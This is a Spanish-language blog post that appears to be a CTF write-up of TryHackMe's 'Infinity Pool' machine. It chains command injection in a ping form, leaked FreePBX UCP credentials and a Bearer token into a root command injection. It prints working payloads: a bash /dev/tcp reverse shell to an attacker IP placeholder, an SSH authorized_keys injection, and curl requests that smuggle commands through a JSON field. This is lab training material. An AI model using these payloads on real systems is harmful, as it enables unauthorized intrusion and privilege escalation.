---
layout: post
title: "Infinity Pool - TryHackMe (Hacker Holidays 2026)"
date: 2026-08-06 12:00:00 -0400
categories: [CTF, tryhackme, boot2root]
tags: [command-injection, ssrf, freepbx, cve-2026-46376, privilege-escalation]
excerpt: "De un botón deshabilitado en la web de un hotel a root, pasando por una inyección de comandos en un endpoint de 'ping', una API interna con Bearer token expuesta en un buzón de voz, y una CVE de 2026 en FreePBX."
---

## Resumen

**Infinity Pool** es una máquina Boot2Root de dificultad *Medium*, parte del evento Hacker Holidays 2026 de TryHackMe. La premisa: el hotel ficticio *Byte Lotus* promete una experiencia "impulsada por tecnología moderna" — y como suele pasar en estos retos, esa tecnología esconde bastante más de lo que un huésped debería poder ver.

La cadena de ataque completa toca varios conceptos interesantes:

- Descubrimiento de rutas ocultas vía `robots.txt`
- Inyección de comandos OS en un formulario de "ping" interno
- Pivote de una reverse shell frágil a acceso SSH persistente inyectando una clave pública
- Enumeración de servicios internos solo accesibles por loopback (varias apps Flask corriendo bajo el mismo árbol de directorios, cada una con un usuario distinto)
- Explotación de **CVE-2026-46376**, una vulnerabilidad real de credenciales hardcodeadas en el módulo UCP de FreePBX
- Filtración de un token Bearer dentro del panel de usuario de FreePBX
- Una segunda inyección de comandos, esta vez en una API interna que corre como `root`

Vamos paso a paso.

---

## 1. Reconocimiento

Un `nmap` completo contra el objetivo solo mostró dos puertos abiertos:

```
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu
80/tcp open  http    gunicorn
```

El detalle interesante ya en el fingerprint HTTP: el título de la página es *"Byte Lotus — Stay Noticed"*, con toda una estética de "hotel de vigilancia de lujo" que, mirando en retrospectiva, es básicamente el hilo temático de toda la máquina.

Al visitar `http://<IP>/`, la web se ve como una landing de hotel normal, con un botón de "Book a suite" deshabilitado. Nada explotable a simple vista, así que toca mirar el código fuente y los recursos estáticos.

### robots.txt como mapa del tesoro

```
User-agent: *
Disallow: /internal/
Disallow: /status
```

Un `robots.txt` que le dice a los buscadores exactamente qué no indexar es, para un atacante, básicamente un índice de contenido. Revisando también `/static/app.js`, encontramos un comentario de desarrollo dejado sin querer:

```js
// TODO(ops): the staff connectivity tool at /status posts to the legacy
// /internal/netcheck handler. Keep it out of the public nav until the new
// auth gateway ships.
```

Esto confirma que `/status` es una herramienta interna de staff, y que hace POST a `/internal/netcheck`.

---

## 2. De un formulario de "ping" a ejecución de comandos

`/status` muestra una herramienta llamada *"Sister-property connectivity"*: un campo de texto donde, supuestamente, el staff comprueba si una propiedad hermana del hotel responde antes de enrutar una transferencia de huésped.

El formulario envía un `host` por POST a `/internal/netcheck`. El comportamiento clásico a probar en cualquier campo que dice "verificar conectividad" es la inyección de comandos vía separadores de shell (`;`, `&&`, `|`, backticks). Con:

```
;ls
```

la respuesta devolvió el listado de archivos del servidor. Confirmado: **inyección de comandos sin sanitizar**.

Enumerando un poco:

```
;whoami          → web
;ls -la /home/web
;cat /home/web/user.txt   → THM{n0_v1s1bl3_3dg3}
```

**User flag obtenida.**

Vale la pena entender la causa raíz. Más adelante, leyendo el código fuente de la app (accesible también vía la propia inyección), quedó claro el problema:

```python
@app.route("/internal/netcheck", methods=["POST"])
def netcheck():
    host = request.form.get("host", "").strip()
    ...
    proc = subprocess.run(
        f"ping -c 1 {host}",
        shell=True,
        capture_output=True,
        text=True,
        timeout=15,
    )
```

`shell=True` combinado con interpolación directa de un `f-string` sin ningún tipo de *allowlist*, *escaping* o uso de `subprocess.run(["ping", "-c", "1", host])` (que evitaría invocar una shell) es la receta clásica del *OS Command Injection*. El servidor corre bajo `gunicorn`, y el proceso que atiende estas peticiones corre como el usuario de bajo privilegio `web`.

---

## 3. De inyección a shell interactiva estable

Trabajar comando por comando a través de un campo de formulario es lento y limitado (no hay manejo de errores decente, ni utilidades interactivas como `sudo -S`). El siguiente paso natural es una reverse shell:

```
;bash -c 'bash -i >& /dev/tcp/<IP_ATACANTE>/4444 0>&1'
```

con un listener esperando:

```bash
nc -lvnp 4444
```

y luego estabilizando con un PTY:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Esto ya da una shell decente, pero tiene un límite importante que se vuelve relevante más adelante: **no permite montar túneles SSH** para llegar a servicios internos vía navegador. La solución fue inyectar una clave SSH propia usando el mismo vector de comando:

```bash
# En la máquina atacante
ssh-keygen -t rsa -b 2048 -f ./ctf_key -N ""
base64 -w0 ctf_key.pub
```

Y a través del mismo campo `host` de `/internal/netcheck`:

```
127.0.0.1;mkdir -p /home/web/.ssh;echo <PUBKEY_BASE64> | base64 -d > /home/web/.ssh/authorized_keys;chmod 700 /home/web/.ssh;chmod 600 /home/web/.ssh/authorized_keys;#
```

Con eso, acceso SSH limpio y — más importante — la posibilidad de hacer *port forwarding*:

```bash
ssh -o IdentitiesOnly=yes -i ctf_key web@<IP>
```

---

## 4. Enumeración de privesc: tres apps, tres usuarios

`sudo -l` pide contraseña (sin sorpresas ahí), y no hay binarios SUID poco comunes ni capabilities interesantes. Lo que sí llamó la atención fue el listado de procesos:

```
root     664  /var/www/infinity_pool/automation/... gunicorn --bind 127.0.0.1:9000
web      665  /var/www/infinity_pool/edge/...       gunicorn --bind 0.0.0.0:80
svc-wat+ 666  /var/www/infinity_pool/watchtower/...  gunicorn --bind 127.0.0.1:3000
```

Tres aplicaciones Flask/gunicorn distintas conviviendo bajo el mismo árbol `/var/www/infinity_pool/`, cada una arrancada como `root` pero delegando el *worker* a un usuario distinto:

| App | Puerto | Usuario del worker |
|---|---|---|
| `edge` | 80 (público) | `web` |
| `watchtower` | 3000 (loopback) | `svc-watch` |
| `automation` | 9000 (loopback) | **`root`** |

Ese patrón — el master del `gunicorn` corriendo como root y solo bajando privilegios en el worker — es exactamente lo que separa "escalada trivial" de "hay que encontrar otra vulnerabilidad": no hay ningún atajo de permisos de archivo que explotar, hay que **encontrar un bug de aplicación** en uno de esos dos servicios internos.

`watchtower` (puerto 3000) resultó ser el más fácil de tantear sin autenticación:

```bash
curl -s http://127.0.0.1:3000/api/config
```

```json
{
  "automation_endpoint": "http://127.0.0.1:9000",
  "ops_note": "UCP still on default template creds (FreePBXUCPTemplateCreator) -- ROTATE.",
  "telephony_pass": "St4yN0t1c3d_2026",
  "telephony_portal": "http://127.0.0.1:8080/ucp",
  "telephony_user": "FreePBXUCPTemplateCreator"
}
```

Una nota operativa de "hay que rotar esto" que nunca se rotó. Un giro bastante realista: el bug no está en el código de `watchtower`, sino en un secreto que quedó expuesto en su configuración pública.

En paralelo, `ss -tlnp` reveló más servicios internos, entre ellos un **FreePBX/Asterisk** completo corriendo en el puerto 8080 (`/ucp`) y AMI en 5038 — coherente con el proceso `asterisk` visto en `ps aux`.

---

## 5. CVE-2026-46376: credenciales de plantilla de FreePBX UCP

Antes de lanzarse a probar credenciales a ciegas, vale la pena confirmar la versión exacta y buscar si hay una vulnerabilidad documentada:

```bash
grep -i version /var/www/html/admin/modules/ucp/module.xml
grep -i version /var/www/html/admin/modules/userman/module.xml
```

```
ucp:     16.0.39
userman: 16.0.44
```

Esa combinación de versiones cae dentro del rango afectado por **[CVE-2026-46376](https://nvd.nist.gov/vuln/detail/CVE-2026-46376)**: en instalaciones de FreePBX que usaron el proceso de plantillas genéricas de UCP, quedan credenciales de ejemplo hardcodeadas (`FreePBXUCPTemplateCreator`) que, si el administrador no las rota manualmente después de la configuración inicial, permiten acceso no autenticado al panel de usuario. El advisory oficial de FreePBX ([GHSA-m55x-h47x-v3gx](https://github.com/FreePBX/security-reporting/security/advisories/GHSA-m55x-h47x-v3gx)) confirma exactamente este comportamiento.

En otras palabras: la nota `"UCP still on default template creds -- ROTATE"` que vimos en `/api/config` no era un detalle decorativo, era literalmente la descripción de esta CVE.

### Accediendo al panel

`8080` solo escucha en loopback, así que hace falta un túnel SSH para llevarlo a un navegador real:

```bash
ssh -o IdentitiesOnly=yes -i ctf_key -L 8080:127.0.0.1:8080 web@<IP>
```

Y ya con `http://127.0.0.1:8080/ucp` abierto localmente, login con:

```
Usuario:    FreePBXUCPTemplateCreator
Contraseña: St4yN0t1c3d_2026
```

Dato práctico para quien quiera reproducirlo por scripting en vez de navegador: el formulario de login de UCP no usa un token CSRF con nombre "estándar" (`csrf_token`, `fpbx_token`, etc.), sino un campo `<input type="hidden" name="token">` que se regenera en cada `GET` a `?display=login` y va atado a la cookie de sesión de esa misma petición. Cualquier intento de reutilizar un token de una petición anterior, o generarlo por separado de las cookies, falla silenciosamente devolviendo el mismo formulario de login.

### El dato que solo aparece navegando

Dentro del dashboard, en la sección de **Voicemail**, apareció un token:

```
cc_auto_7b3f9a1c4e0d2f6a
```

Este es un buen ejemplo de un dato que **no se puede scriptear a ciegas**: no había forma de saber de antemano que el secreto estaba ahí sin explorar la interfaz real del panel. Es la razón por la que vale la pena tener acceso gráfico (vía el túnel SSH) y no insistir en automatizarlo todo por `curl` desde el primer momento.

---

## 6. La segunda inyección: la API de `automation`

De vuelta en `watchtower` sabíamos que `automation_endpoint` apuntaba a `http://127.0.0.1:9000` — el servicio que corre como `root`. Con el token del buzón de voz como `Bearer`, se puede hablar con su API:

```bash
curl -sS -X POST http://127.0.0.1:9000/jobs/export \
  -H 'Authorization: Bearer cc_auto_7b3f9a1c4e0d2f6a' \
  -H 'Content-Type: application/json' \
  --data-binary '{"report":"latest"}'
```

```json
{"command":"tar czf /var/automation/exports/latest.tgz /var/automation/data 2>&1", ...}
```

La respuesta expone el comando exacto que se ejecuta en el backend, construido a partir del campo `"report"` sin sanitizar — el mismo patrón de vulnerabilidad que en `/internal/netcheck`, pero esta vez en un endpoint que corre con privilegios de `root`. Confirmando con `id`:

```bash
curl -sS -X POST http://127.0.0.1:9000/jobs/export \
  -H 'Authorization: Bearer cc_auto_7b3f9a1c4e0d2f6a' \
  -H 'Content-Type: application/json' \
  --data-binary '{"report":"test;id;#"}'
```

```
uid=0(root) gid=0(root) groups=0(root)
```

Y finalmente, leyendo la flag:

```bash
curl -sS -X POST http://127.0.0.1:9000/jobs/export \
  -H 'Authorization: Bearer cc_auto_7b3f9a1c4e0d2f6a' \
  -H 'Content-Type: application/json' \
  --data-binary '{"report":"test;cat /root/root.txt;#"}'
```

```
THM{tr4c3d_t0_th3_h0r1z0n}
```

**Root flag obtenida.**

---

## 7. Retrospectiva: dónde me trabé y por qué

Creo que la parte más útil de este post no es la lista de comandos (esa se puede seguir en cualquier writeup), sino en qué momentos perdí tiempo y qué cambiaría la próxima vez:

**Insistí demasiado en automatizar el login de UCP solo con `curl`.** FreePBX UCP maneja sesión y token CSRF de forma bastante específica, y perseguir eso a ciegas por terminal —incluyendo errores tontos de copy-paste en variables de bash— fue más lento que simplemente abrir un túnel SSH y usar un navegador real desde el principio.

**Tardé en pasar de la reverse shell a un acceso SSH persistente.** La reverse shell inicial es suficiente para leer archivos y confirmar el `whoami`, pero en cuanto quedó claro que había servicios internos solo accesibles por loopback (UCP en 8080), inyectar una clave SSH propia debería haber sido el siguiente paso obvio — no algo que se intenta recién después de estancarse.

**El secreto del token de `automation` estaba en un lugar que solo se descubre navegando.** Ningún comando de enumeración por sí solo iba a mostrar el contenido de un buzón de voz dentro de un panel de FreePBX. Es un recordatorio de que en máquinas con interfaces web ricas, hay que combinar enumeración automatizada con exploración manual de la UI.

**Verificar la CVE antes de "solo probar" las credenciales evita perder el hilo.** Confirmar la versión exacta de `ucp`/`userman` y cruzarla contra el NVD (**CVE-2026-46376**) no solo valida que el vector es correcto, sino que da contexto real sobre por qué existe: un proceso de configuración de plantillas que deja credenciales de ejemplo si el admin no las rota. Entender el "por qué" de una vulnerabilidad ayuda a reconocerla más rápido la próxima vez.

---

## Resumen de la cadena de ataque

1. `robots.txt` revela `/status` y `/internal/`
2. Inyección de comandos en `/internal/netcheck` (parámetro `host`) → shell como `web`
3. User flag en `/home/web/user.txt`
4. Enumeración de procesos revela tres apps Flask internas (`edge`, `watchtower`, `automation`), la última corriendo como `root`
5. `watchtower` expone en `/api/config` credenciales sin rotar de FreePBX UCP
6. Las credenciales corresponden a **CVE-2026-46376** (plantillas UCP con credenciales hardcodeadas)
7. Túnel SSH (tras inyectar una clave propia) + login en UCP → token Bearer en la sección Voicemail
8. Ese token autentica contra la API interna de `automation` (puerto 9000, root) → segunda inyección de comandos
9. Root flag en `/root/root.txt`

---

*Máquina: Infinity Pool — TryHackMe, evento Hacker Holidays 2026 (dificultad Medium).*
